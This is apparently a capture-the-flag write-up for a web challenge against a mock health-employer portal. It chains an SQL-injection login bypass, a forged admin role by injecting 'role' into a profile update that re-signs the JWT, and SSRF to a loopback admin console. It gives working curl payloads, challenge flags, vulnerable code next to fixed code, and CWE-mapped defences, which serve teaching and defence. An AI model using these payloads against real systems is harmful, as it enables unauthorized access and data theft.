# RP-01 (4 of 4) — I Want to be a Real Boy

**Event:** DEADFACE CTF
**Category:** Web
**Target:** `http://45.79.200.170:3000/` (Health Spark Employer Portal)
**Flag:** `deadface{oh_you_shouldnt_be_here}`

---

## TL;DR

The profile endpoint re-issues your session token from **whatever profile fields
you post**, including `role`. Post `{"role":"admin"}` and the server hands you a
signed administrator JWT. That unlocks `/api/admin/fetch-photo`, an SSRF that
fetches any URL *from the application server* — point it at
`http://127.0.0.1:8080/` and you reach an internal admin console that is bound
to the loopback interface and never exposed publicly. The console prints the
flag.

```
POST /api/profile   {"name":"John Smith","role":"admin"}   -> admin JWT
POST /api/admin/fetch-photo  {"url":"http://127.0.0.1:8080/"}
  -> HealthSpark :: Internal Admin Console
  -> admin_console_token: deadface{oh_you_shouldnt_be_here}
```

---

## 1. Getting a session

Same entry point as the rest of the series — the login form is SQL-injectable
and discloses the matched row:

```bash
curl -s -X POST http://45.79.200.170:3000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"'"'"' OR 1=1-- -","password":"x"}'
```

```json
{"username":"john.smith","name":"John Smith","role":"user",
 "departmentid":10685,"password":"Locked_In_And_Ready", ...}
```

Log in with those credentials. The session is an HS256 JWT:

```json
{"sub":"john.smith","name":"John Smith","role":"user","departmentid":10685,
 "iat":1792329471,"exp":1792330371}
```

Note `role` is a **claim in the token** — that's the thing worth attacking, not
the database. (There is no admin row in `users`; every account is `role: user`.)

---

## 2. The escalation: `/api/profile`

The endpoint isn't in the frontend at all. It's documented in the OpenAPI spec
that the previous challenge turned up at `/api-docs/swagger-ui-init.js`:

```json
"/api/profile": {
  "post": {
    "summary": "Update your profile",
    "description": "Updates your profile and returns a refreshed session token.
                    Your submitted profile fields are reflected in the returned
                    session claims."
  }
}
```

Read that description literally: *your submitted profile fields are reflected in
the returned session claims*. The handler is doing something like:

```js
const { name, role } = req.body;                 // takes whatever you send
const token = jwt.sign({
  sub: req.user.sub,
  name,
  role,                                          // <-- attacker controlled
  departmentid: req.user.departmentid,
}, SECRET);
res.json({ message: "Profile updated.", token, profile: { ... } });
```

The endpoint only intends to let you change `name`. Because it spreads the
request body into the token payload, it's a **mass-assignment / claim-injection**
bug: the token is signed correctly, by the server, with a role you chose.

### Exploit

```bash
curl -s -X POST http://45.79.200.170:3000/api/profile \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"name":"John Smith","role":"admin"}'
```

```json
{
  "message": "Profile updated.",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBTbWl0aCIsInJvbGUiOiJhZG1pbiIsInN1YiI6ImpvaG4uc21pdGgiLCJkZXBhcnRtZW50aWQiOjEwNjg1LCJpYXQiOjE3OTIzMjk0NzEsImV4cCI6MTc5MjMzMDM3MX0.j-T3KHom7O8-jmVhPR4TmB_8FTbkNFqLzTLX_7cjl6s",
  "profile": {"name":"John Smith","role":"admin","sub":"john.smith","departmentid":10685}
}
```

Decoding the new token:

```json
{"name":"John Smith","role":"admin","sub":"john.smith","departmentid":10685,
 "iat":1792329471,"exp":1792330371}
```

`role: admin`, validly signed. No secret cracking, no algorithm confusion —
the server signed it for us. (The earlier attempts in this series to forge a
token by brute-forcing the HS256 secret were the wrong approach entirely; the
app just hands out the privilege.)

---

## 3. The payoff: SSRF into the internal network

`/api/admin/fetch-photo` has been returning `403 Administrator role required`
all series. With the new token it opens:

```bash
curl -s -X POST http://45.79.200.170:3000/api/admin/fetch-photo \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"url":"http://127.0.0.1:8080/"}'
```

Port 8080 answers with something that is explicitly not public:

```html
<title>HealthSpark :: Internal Admin Console</title>
...
<p>RESTRICTED. This service is bound to the internal interface and is not
   exposed to the public network.</p>
<h2>System status</h2>
<ul><li>node: prod-01</li><li>uptime: nominal</li>
    <li>scheduled job: nightly eligibility export</li></ul>
<h2>Operator note</h2>
<pre>If you can read this, the request reached us from the application server.
admin_console_token: deadface{oh_you_shouldnt_be_here}</pre>
```

**Flag:** `deadface{oh_you_shouldnt_be_here}`

Port discovery was a short, paced loop over plausible ports — 8080 was the only
one that answered anything other than `ECONNREFUSED`. Every path on 8080 returns
the same catch-all page, so there's nothing further to enumerate there.

> This is the one place in the series where an internal port matters, and the
> challenge note forbids scanning the host from outside. The SSRF is the
> sanctioned way to reach it: the request originates from the application
> server, on loopback.

---

## 4. Root cause

Two independent bugs chained:

```js
// vulnerable - the token is rebuilt from user input
app.post('/api/profile', requireAuth, (req, res) => {
  const token = jwt.sign({ ...req.user, ...req.body }, SECRET);   // role leaks in
  res.json({ message: 'Profile updated.', token, profile: jwt.decode(token) });
});

// vulnerable - fetches any URL, including loopback / link-local / metadata
app.post('/api/admin/fetch-photo', requireAdmin, async (req, res) => {
  const r = await fetch(req.body.url);
  res.send(await r.text());
});
```

```js
// fixed - explicit allowlist of mutable fields, role taken from the DB
app.post('/api/profile', requireAuth, async (req, res) => {
  const name = String(req.body.name || '').slice(0, 100);
  await db.users.updateName(req.user.sub, name);
  const row = await db.users.byUsername(req.user.sub);      // authoritative
  const token = jwt.sign(
    { sub: row.username, name: row.name, role: row.role, departmentid: row.departmentid },
    SECRET, { expiresIn: '15m' });
  res.json({ message: 'Profile updated.', token });
});

// fixed - scheme + host allowlist, block internal ranges
const ALLOWED = new URL('https://media.healthspark.example');
app.post('/api/admin/fetch-photo', requireAdmin, async (req, res) => {
  const u = new URL(req.body.url);
  if (u.origin !== ALLOWED.origin) return res.status(400).json({ error: 'Bad URL' });
  // plus: resolve DNS and reject RFC1918 / loopback / 169.254.0.0/16 / ::1
  res.send(await fetch(u).then(r => r.text()));
});
```

| # | Issue | CWE |
|---|---|---|
| 1 | Token rebuilt from user-controlled fields (claim injection) | CWE-915 / CWE-269 |
| 2 | Server-side request forgery with no destination allowlist | CWE-918 |
| 3 | Internal admin service trusted because it is "not exposed" | CWE-306 / CWE-668 |
| 4 | Secrets (console token) printed in a service banner | CWE-200 |

Defence in depth, in order of value: **never derive authorisation claims from
request input** — read the role from the database on every token issue; treat
the network boundary as one control among several, not *the* control (the
console had no authentication at all, only non-routability); and constrain the
SSRF fetcher with a scheme+host allowlist, a DNS-rebinding-safe resolved-IP
check, and no redirect following.

---

## 5. Solve script

`solve_boy.py` runs the full chain:

```bash
python3 solve_boy.py                       # defaults to the challenge host
python3 solve_boy.py http://host:port
```

```
[*] Stage 1 - credentials via /api/login SQLi
    [+] john.smith / Locked_In_And_Ready
    [+] session role=user
[*] Stage 2 - POST /api/profile with role=admin
    [+] new token claims: {"name":"John Smith","role":"admin","sub":"john.smith",
                           "departmentid":10685,"iat":...,"exp":...}
[*] Stage 3 - SSRF into the internal network
    [*] 127.0.0.1:3000 -> HTTP 200 (3633 bytes)
    [*] 127.0.0.1:8080  -> HTTP 200 console  deadface{oh_you_shouldnt_be_here}

 FLAG: deadface{oh_you_shouldnt_be_here}
```

---

## 6. Series recap

| # | Challenge | Bug | Flag |
|---|---|---|---|
| 1 | dashboard recon | HTML comment | `deadface{web01_dashboard_recon}` |
| 2 | Real Pain in the Prostate | SQLi disclosure in `/api/login` | `deadface{typical_and_classic}` |
| 3 | Do People Still Fax in 2026? | Document IDOR via `/file_document` | `deadface{someone_should_report_this}` |
| — | (same app) | Cross-department IDOR on `/api/patients` | `deadface{hipaa_exposure_is_bad}` |
| 4 | I Want to be a Real Boy | Claim injection in `/api/profile` → SSRF | `deadface{oh_you_shouldnt_be_here}` |

The single thread running through all four: **the server keeps trusting
client-supplied values for authorisation decisions** — the department in the
request body, the document's owner in the request body, and finally the role in
the token payload. Every challenge is the same mistake at a different layer.
